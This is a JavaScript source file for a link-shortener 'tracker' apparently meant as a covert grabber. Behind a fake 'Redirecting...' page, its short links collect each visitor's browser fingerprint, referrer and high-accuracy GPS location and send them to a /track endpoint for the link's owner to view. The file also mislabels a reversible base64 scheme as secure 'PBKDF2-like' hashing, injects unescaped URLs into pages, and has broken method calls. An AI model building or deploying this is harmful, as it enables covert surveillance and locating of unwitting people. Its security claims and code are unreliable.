// Secure user authentication with PBKDF2-like hashing
class AuthManager {
    constructor() {
        this.users = JSON.parse(localStorage.getItem('users')) || {};
        this.currentUser = localStorage.getItem('currentUser');
        this.init();
    }

    init() {
        if (this.currentUser && this.validateUser(this.currentUser)) {
            this.showDashboard();
        }
    }

    hashPassword(password, salt = 'femboy-hub-salt-2026') {
        // Simple PBKDF2-like hashing for client-side
        let hash = salt + password;
        for (let i = 0; i < 10000; i++) {
            hash = btoa(hash).split('').reverse().join('');
        }
        return btoa(hash);
    }

    register(username, email, password) {
        if (this.users[username]) {
            alert('Username already exists!');
            return false;
        }
        if (password.length < 6) {
            alert('Password must be at least 6 characters!');
            return false;
        }

        const hashedPassword = this.hashPassword(password);
        this.users[username] = {
            password: hashedPassword,
            email: email || '',
            created: new Date().toISOString(),
            links: []
        };
        localStorage.setItem('users', JSON.stringify(this.users));
        alert('Account created successfully!');
        this.login(username, password);
        return true;
    }

    login(username, password) {
        const hashedPassword = this.hashPassword(password);
        if (this.users[username] && this.users[username].password === hashedPassword) {
            localStorage.setItem('currentUser', username);
            this.currentUser = username;
            this.showDashboard();
            return true;
        }
        alert('Invalid credentials!');
        return false;
    }

    logout() {
        localStorage.removeItem('currentUser');
        this.currentUser = null;
        document.getElementById('authScreen').style.display = 'flex';
        document.getElementById('dashboard').style.display = 'none';
    }

    validateUser(username) {
        return this.users[username] !== undefined;
    }

    showDashboard() {
        document.getElementById('authScreen').style.display = 'none';
        document.getElementById('dashboard').style.display = 'block';
        this.loadLinks();
        this.updateStats();
    }
}

// Link tracking system
class LinkTracker {
    constructor() {
        this.auth = new AuthManager();
        this.trackerScript = `
            <script>
                (function(){
                    const data = {
                        ip: '${window.location.hostname}',
                        userAgent: navigator.userAgent,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookiesEnabled: navigator.cookieEnabled,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        screen: \`\${screen.width}x\${screen.height}\`,
                        referrer: document.referrer || 'direct'
                    };
                    
                    // Geolocation (non-blocking)
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                data.lat = pos.coords.latitude;
                                data.lng = pos.coords.longitude;
                                data.accuracy = pos.coords.accuracy;
                                sendData(data);
                            },
                            () => sendData(data),
                            {timeout: 5000, enableHighAccuracy: true}
                        );
                    } else {
                        sendData(data);
                    }
                    
                    function sendData(payload) {
                        fetch('/track', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify(payload)
                        }).catch(() => {});
                        
                        // Redirect after 100ms delay
                        setTimeout(() => {
                            ${window.location.href.includes('?url=') ? 
                                `window.location.href = decodeURIComponent("${window.location.search.split('url=')[1]}");` : 
                                `window.location.href = '/';`
                            }
                        }, 100);
                    }
                })();
            </script>
        `;
    }

    createShortLink() {
        const targetUrl = document.getElementById('targetUrl').value.trim();
        if (!targetUrl.match(/^https?:\/\//)) {
            alert('Please enter a valid URL!');
            return;
        }

        const id = 'link_' + Math.random().toString(36).substr(2, 9);
        const shortUrl = `${window.location.origin}/${id}`;
        const linkData = {
            id,
            targetUrl,
            shortUrl,
            clicks: [],
            created: new Date().toISOString(),
            stats: { totalClicks: 0, uniqueIPs: 0, geolocated: 0 }
        };

        const userLinks = this.auth.users[this.auth.currentUser].links;
        userLinks.push(linkData);
        localStorage.setItem('users', JSON.stringify(this.auth.users));
        
        document.getElementById('shortLinkUrl').value = shortUrl;
        document.getElementById('shortLinkResult').style.display = 'block';
        document.getElementById('targetUrl').value = '';
        
        this.loadLinks();
        this.updateStats();
    }

    loadLinks() {
        const userLinks = this.auth.users[this.auth.currentUser]?.links || [];
        const container = document.getElementById('linksList');
        
        if (userLinks.length === 0) {
            container.innerHTML = '<div style="text-align: center; padding: 3rem; color: var(--text-muted);">No links yet. Create your first short link above!</div>';
            return;
        }

        container.innerHTML = userLinks.map(link => `
            <div class="link-row" onclick="app.viewLinkDetails('${link.id}')">
                <span>#${link.id.slice(-6)}</span>
                <span><a href="${link.shortUrl}" target="_blank" style="color: var(--primary); text-decoration: none;">${link.shortUrl}</a></span>
                <span><span class="badge badge-clicks">${link.stats.totalClicks || 0} clicks</span></span>
                <span>${new Date(link.created).toLocaleDateString()}</span>
                <div style="display: flex; gap: 0.5rem;">
                    <span class="badge badge-location">${(link.stats.geolocated || 0)} GPS</span>
                    <button class="btn btn-secondary" style="padding: 0.5rem 1rem; font-size: 0.8rem;" onclick="app.copyLink('${link.shortUrl}', event)">Copy</button>
                </div>
            </div>
        `).join('');
    }

    viewLinkDetails(linkId) {
        const userLinks = this.auth.users[this.auth.currentUser].links;
        const link = userLinks.find(l => l.id === linkId);
        if (!link) return;

        const modal = document.getElementById('hitModal');
        const content = document.getElementById('modalContent');
        
        content.innerHTML = `
            <div style="display: grid; grid-template-columns: 1fr auto 1fr; gap: 2rem; margin-bottom: 2rem;">
                <div>
                    <h4>Short URL</h4>
                    <a href="${link.shortUrl}" target="_blank">${link.shortUrl}</a>
                </div>
                <div style="text-align: center;">
                    <div style="font-size: 2rem; font-weight: 800; color: var(--primary);">${link.stats.totalClicks || 0}</div>
                    <div>Total Hits</div>
                </div>
                <div>
                    <h4>Target</h4>
                    <a href="${link.targetUrl}" target="_blank">${link.targetUrl}</a>
                </div>
            </div>
            
            <h4>Recent Hits</h4>
            <div class="treeview">
                ${this.renderHitsTree(link.clicks || [])}
            </div>
        `;

        document.getElementById('modalTitle').textContent = `Link #${linkId.slice(-6)}`;
        modal.style.display = 'flex';
    }

    renderHitsTree(clicks) {
        if (clicks.length === 0) {
            return '<div style="padding: 2rem; text-align: center; color: var(--text-muted);">No hits yet</div>';
        }

        return clicks.slice(0, 20).map(click => {
            const geo = click.lat ? 
                `<div>📍 ${click.lat.toFixed(4)}, ${click.lng.toFixed(4)} (Accuracy: ${Math.round(click.accuracy)}m)</div>` : 
                '<div>📍 Location unavailable</div>';
                
            return `
                <div class="tree-item">
                    <div><strong>${click.ip || 'Unknown IP'}</strong> • ${new Date(click.timestamp).toLocaleString()}</div>
                    ${geo}
                    <div style="font-size: 0.9rem; color: var(--text-muted); margin-top: 0.25rem;">
                        ${click.userAgent.slice(0, 80)}...
                        ${click.platform ? `• ${click.platform}` : ''}
                        ${click.referrer !== 'direct' ? `• ${click.referrer.slice(0, 40)}...` : ''}
                    </div>
                </div>
            `;
        }).join('');
    }

    copyShortLink() {
        const url = document.getElementById('shortLinkUrl');
        url.select();
        document.execCommand('copy');
        const btn = event.target;
        const original = btn.innerHTML;
        btn.innerHTML = 'Copied! ✨';
        setTimeout(() => btn.innerHTML = original, 2000);
    }

    copyLink(url, event) {
        event.stopPropagation();
        navigator.clipboard.writeText(url).then(() => {
            const btn = event.target;
            const original = btn.innerHTML;
            btn.innerHTML = 'Copied!';
            setTimeout(() => btn.innerHTML = original, 2000);
        });
    }

    updateStats() {
        const userLinks = this.auth.users[this.auth.currentUser]?.links || [];
        const totalLinks = userLinks.length;
        const totalClicks = userLinks.reduce((sum, link) => sum + (link.stats.totalClicks || 0), 0);
        const uniqueIPs = new Set(userLinks.flatMap(link => link.clicks?.map(c => c.ip) || [])).size;
        const geolocated = userLinks.reduce((sum, link) => sum + (link.stats.geolocated || 0), 0);

        document.getElementById('totalLinks').textContent = totalLinks;
        document.getElementById('totalClicks').textContent = totalClicks;
        document.getElementById('uniqueIPs').textContent = uniqueIPs;
        document.getElementById('geolocated').textContent = geolocated;
    }
}

// Global app instance
const app = new LinkTracker();

// UI Event Handlers
function login() {
    const username = document.getElementById('loginUsername').value.trim();
    const password = document.getElementById('loginPassword').value;
    if (username && password) {
        app.auth.login(username, password);
    }
}

function register() {
    const username = document.getElementById('regUsername').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const password = document.getElementById('regPassword').value;
    const confirmPassword = document.getElementById('regConfirmPassword').value;
    
    if (password !== confirmPassword) {
        alert('Passwords do not match!');
        return;
    }
    app.auth.register(username, email, password);
}

function showRegister() {
    document.getElementById('loginForm').style.display = 'none';
    document.getElementById('registerForm').style.display = 'block';
}

function showLogin() {
    document.getElementById('registerForm').style.display = 'none';
    document.getElementById('loginForm').style.display = 'block';
}

function logout() {
    app.auth.logout();
}

function closeModal() {
    document.getElementById('hitModal').style.display = 'none';
}

// Handle tracking requests (Cloudflare Workers or serverless function needed for real tracking)
document.addEventListener('DOMContentLoaded', () => {
    const path = window.location.pathname.slice(1);
    if (path.startsWith('link_')) {
        // This is a tracking link - serve the tracker
        document.body.innerHTML = `
            <html>
                <head><title>Redirecting...</title></head>
                <body style="background: #000; color: #fff; font-family: Arial; text-align: center; padding-top: 100px;">
                    <h1>Redirecting...</h1>
                    <p>Please wait while we prepare your destination</p>
                </body>
                ${app.trackerScript}
            </html>
        `;
    }
});

// Enter to login/register
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        if (document.getElementById('loginForm').style.display !== 'none') {
            login();
        } else {
            register();
        }
    }
});
